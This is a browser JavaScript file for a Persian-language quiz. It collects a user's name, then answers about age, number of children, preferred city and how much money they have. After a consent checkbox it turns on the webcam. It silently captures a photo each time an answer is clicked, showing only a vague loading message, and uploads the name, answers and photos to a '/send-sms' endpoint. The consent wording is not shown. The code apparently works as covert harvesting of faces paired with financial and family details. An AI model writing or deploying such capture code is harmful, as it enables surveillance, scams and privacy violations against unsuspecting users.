const questions = [
  { key: 'animal', text: 'کدام حیوان را دوست دارید؟', options: ['سگ','گربه','لاک‌پشت'] },
  { key: 'age', text: 'چند سال دارید؟', options: ['20 تا 30','30 تا 40','40 تا 50'] },
  { key: 'kids', text: 'چند تا بچه دارید؟', options: ['1','2 تا 3','4 تا'] },
  { key: 'city', text: 'کدام شهر را ترجیح می‌دهید؟', options: ['کیش','شمال','تبریز'] },
  { key: 'money', text: 'در حال حاضر چقدر پول دارید؟', options: ['یک میلیون','1000 تا 2000 میلیون','1تا 2 میلیارد'] },
];

const nameArea = document.getElementById('nameArea');
const userNameInput = document.getElementById('userName');
const nameNextBtn = document.getElementById('nameNext');
const consentArea = document.getElementById('consentArea');
const agree = document.getElementById('agree');
const startBtn = document.getElementById('start');
const qText = document.getElementById('qText');
const qOptions = document.getElementById('qOptions');
const questionArea = document.getElementById('questionArea');
const nextBtn = document.getElementById('next');
const finishBtn = document.getElementById('finish');
const status = document.getElementById('status');

let stream = null;
let video = null;
let canvas = null;
let ctx = null;
let current = 0;
let answers = {};
let photos = [];
let userName = '';

// مرحله اسم
nameNextBtn.addEventListener('click', () => {
  const name = userNameInput.value.trim();
  if(!name){
    alert('لطفاً اسم خود را وارد کنید.');
    return;
  }
  userName = name;
  nameArea.classList.add('hidden');
  consentArea.classList.remove('hidden');
});

// رضایت
agree.addEventListener('change', ()=> startBtn.disabled = !agree.checked);

startBtn.addEventListener('click', async () => {
  try {
    status.textContent = 'در حال درخواست دسترسی ...';
    video = document.createElement('video');
    video.autoplay = true;
    video.playsInline = true;
    canvas = document.createElement('canvas');
    ctx = canvas.getContext('2d');
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await new Promise(r => setTimeout(r, 1000));
    consentArea.classList.add('hidden');
    questionArea.classList.remove('hidden');
    renderQuestion();
    status.textContent = '';
  } catch (e) {
    status.textContent = 'دسترسی داده نشد: ' + e.message;
  }
});

function renderQuestion() {
  const q = questions[current];
  qText.textContent = q.text;
  qOptions.innerHTML = '';
  q.options.forEach(opt => {
    const b = document.createElement('button');
    b.textContent = opt;
    b.onclick = ()=> selectOption(opt, b);
    qOptions.appendChild(b);
  });
  nextBtn.disabled = true;
  finishBtn.classList.add('hidden');
}

async function selectOption(opt, btn){
  answers[questions[current].key] = opt;
  Array.from(qOptions.children).forEach(b => b.classList.remove('selected'));
  btn.classList.add('selected');
  nextBtn.disabled = false;
  status.textContent = 'در حال ...';
  const dataUrl = await takePhoto();
  photos.push(dataUrl);
  status.textContent = 'بعدی';
}

function takePhoto(){
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/jpeg', 0.8);
}

nextBtn.addEventListener('click', ()=>{
  current++;
  if(current >= questions.length){
    qText.textContent = 'تمام شد — روی پایان بزنید';
    qOptions.innerHTML = '';
    nextBtn.disabled = true;
    finishBtn.classList.remove('hidden');
  } else {
    renderQuestion();
  }
});

finishBtn.addEventListener('click', async ()=>{
  status.textContent = 'در حال ارسال...';
  const payload = { userName, answers, photos };

  try {
    const res = await fetch('/send-sms', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const text = await res.text();
    console.log("پاسخ سرور:", text);

    let j;
    try {
      j = JSON.parse(text);
    } catch(e){
      status.textContent = '⚠️ خطای دریافت پاسخ از سرور';
      return;
    }

    status.textContent = j.ok ? '✅ ارسال موفق' : '⚠️ خطا: ' + j.error;

  } catch(err){
    status.textContent = '⚠️ خطا در اتصال به سرور: ' + err.message;
  }

  if(stream) stream.getTracks().forEach(t=>t.stop());
});
